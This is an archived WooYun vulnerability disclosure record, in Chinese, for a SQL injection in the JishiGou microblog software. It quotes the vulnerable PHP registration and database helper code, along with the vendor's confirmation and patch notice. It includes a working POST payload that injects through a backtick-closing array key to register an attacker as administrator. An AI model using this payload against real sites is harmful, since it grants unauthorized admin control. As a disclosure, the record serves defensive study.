{"id": 6009, "wybug_id": "wooyun-2013-043311", "wybug_title": "记事狗微博全版本SQL注入漏洞可直接注册管理员2", "wybug_corp": "杭州神话", "wybug_author": "Chora", "wybug_date": "2013-11-19 11:45", "wybug_open_date": "2014-02-17 11:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-17：\t细节向公众公开  简要描述： 每个月总有那么几天会发几个。 详细说明：  这次的问题依然是一个通用函数，而且涉及面比较广，用到该函数的全部存在注入。。。好好改改。因为密码有salt，所以爆管理账号密码意义不大，直接在注册的页面注射成管理员。wap/modules/member.mod.php\nfunction DoRegister() \t{\t\t\t\tif(MEMBER_ID != 0 AND false == $this->IsAdmin)\t\t{\t\t\t$this->Messager('您已经是注册用户，无需再注册！', -1);\t\t}......\t\t        $this->Post = array_iconv('UTF-8', $this->Config['charset'], $this->Post);\t\t$password = $this->Post['password']; //密码\t\t$email = $this->Post['email']; //email\t\t$username = $nickname = $this->Post['nickname']; //用户名\t\t\t\tif(strlen($password) < 5)        {\t\t\t$this->Messager(\"密码过短，请设置至少5位\",-1);\t\t}\t\t\t\t$uid = jsg_member_register($nickname, $password, $email);//注册,不是关键函数，步过。\t\tif($uid < 1)\t\t{\t\t\t$regconf = ConfigHandler::get('register');\t\t\t$rets = array(\t        \t'0' => '【注册失败】有可能是站点关闭了注册功能',\t        \t'-1' => '帐户/昵称 不合法，含有不允许注册的字符，请尝试更换一个。',\t        \t'-2' => '帐户/昵称 不允许注册，含有被保留的字符，请尝试更换一个。',\t        \t'-3' => '帐户/昵称 已经存在了，请尝试更换一个。',\t        \t'-4' => 'Email 不合法，请输入正确的Email地址。',\t        \t'-5' => 'Email 不允许注册，请尝试更换一个。',\t        \t'-6' => 'Email 已经存在了，请尝试更换一个。',\t\t\t\t'-7' => '您的IP地址 ' . $GLOBALS['_J']['client_ip'] . ' 已经被限制注册了（一个IP地址 '.$regconf['time_html'].' 之内，最多只能注册 '.$regconf['limit'].' 个用户），请稍后再试或联系管理员',\t        );\t        $this->Messager($rets[$uid], null);\t\t}\t\t\t\t$datas = array();\t\t$datas['uid'] = $uid;\t\t$datas['province'] = $this->Post['province']; \t\t$datas['city'] = $this->Post['city'];\t\tif($this->_sms_register())\t\t{\t\t\t$datas['phone'] = $sms_bind_num;\t\t}\t\tjtable('members')->update($datas);//跟进0x01......\t}\ninclude/function/global.func.php 0x01\nstatic function update($table, $data, $condition, $unbuffered = false, $low_priority = false)\t{\t\t$sql = DB::field($data); //问题出在自定义field函数上，跟进\t\t$cmd = \"UPDATE \".($low_priority ? 'LOW_PRIORITY' : '');\t\t$table = DB::table($table);\t\t$res = DB::query(\"$cmd $table SET $sql \".DB::where($condition), $unbuffered ? 'UNBUFFERED' : '');\t\treturn $res;\t}static function field($array, $glue = ',', $is_where=0) {\t\t$sql = $comma = '';\t\t\t\tforeach ($array as $k => $v) {\t\t\t$s = '';\t\t\t\t\t\tif(is_array($v)) {//遍历传递过来的数组的值，检查每一个值是否为数组，是数组则往下执行。\t\t\t\t\t\t\t\t$g = $v['glue'];把键名为glue的数组的值赋值给$g\t\t\t\tif($g) {\t\t\t\t\t$kk = ($v['key'] ? $v['key'] : $k); //把键名为key的数组的值赋值给$kk\t\t\t\t\t$vv = $v['val'];//把键名为vlue的数组的值赋值给$vv\t\t\t\t\tswitch ($g) {//$g就是符号，我们构造$g为等号，也就是构造$v['glue']的值为=号。\t\t\t\t\t\tcase '=':\t\t\t\t\t\tcase '>':\t\t\t\t\t\tcase '<':\t\t\t\t\t\tcase '<>':\t\t\t\t\t\tcase '>=':\t\t\t\t\t\tcase '<=':\t\t\t\t\t\t\t$s = \"`{$kk}`{$g}'{$vv}'\"; /*$kk的值,$vv的值都需要构造，我们虽然不能引入单引号，但是我们能引入反引号，反引号不受GPC的限制，$kk在反引号内，而且$kk我们可控。所以只要用到了这个field函数，随便找一个我们能控制的域，把他以数组的方式提交即可。比如：$_POST['str']这个域，我们提交：str[glue]==&str[val]=endvlue&str[key]=beginkey`=beginvalue,`endkey就成了`beginkey`=beginvalue,`endkey`='endvlue'关键点就在于这个str[key]闭合反引号比如我的这个例子注册管理员，需要role_id=2,role_type=admin我们提交province[glue]==&province[val]=admin&province[key]=role_id`=2,`role_type即可*/\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase '-':\t\t\t\t\t\tcase '+':\t\t\t\t\t\tcase '|':\t\t\t\t\t\tcase '&':\t\t\t\t\t\tcase '^':\t\t\t\t\t\t\t$s = \"`{$kk}`=`{$kk}`{$g}'{$vv}'\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase 'like':\t\t\t\t\t\t\t$s = \"`{$kk}` LIKE('{$vv}')\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase 'in':\t\t\t\t\t\tcase 'notin':\t\t\t\t\t\t\t$s = \"`{$kk}`\".('notin'==$g ? ' NOT' : '').\" IN(\".jimplode($vv).\")\";\t\t\t\t\t\t\tbreak;\t\t\t\t\t\tdefault:\t\t\t\t\t\t\texit(\"glue $g is invalid\");\t\t\t\t\t}\t\t\t\t} else {\t\t\t\t\tif($is_where) {\t\t\t\t\t\t$s = \"`{$k}` IN(\".jimplode($v).\")\";\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t} else {\t\t\t\t$s = \"`{$k}`='$v'\";\t\t\t}\t\t\tif($s) {\t\t\t\t$sql .= $comma . $s;\t\t\t\t$comma = $glue;\t\t\t}\t\t}\t\treturn $sql;\t}\nPOST提交password=123456&nickname=test1test&email=test1test@test.com&province[glue]==&province[val]=admin&province[key]=role_id`=2,`role_type到http://localhost/jishigou/wap/?mod=member&code=doregister即可注册管理员。   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  继续求包养。   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-11-19 11:54 厂商回复： 非常感谢 Chora@乌云 的反馈，这个问题影响到V4.x版本，已经有发布补丁包修复了 http://t.jishigou.net/topic/250858 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-19 12:12 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  @杭州神话 我想问下贵站的最新补丁为何不打包到源码安装包里面，白忙活啊。    \n     2014-04-18 15:50 |    \t\tevil_webshell \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 致力于web层面的安全，热爱黑客技术，正在...)\t\t \n  学习了，分析的很到位。不错支持了    \n     2014-09-08 20:40 |    \t\twinston \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:7        | nothing)\t\t \n  很好奇楼主使用的ff插件是什么？不知道能否告诉 一下？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}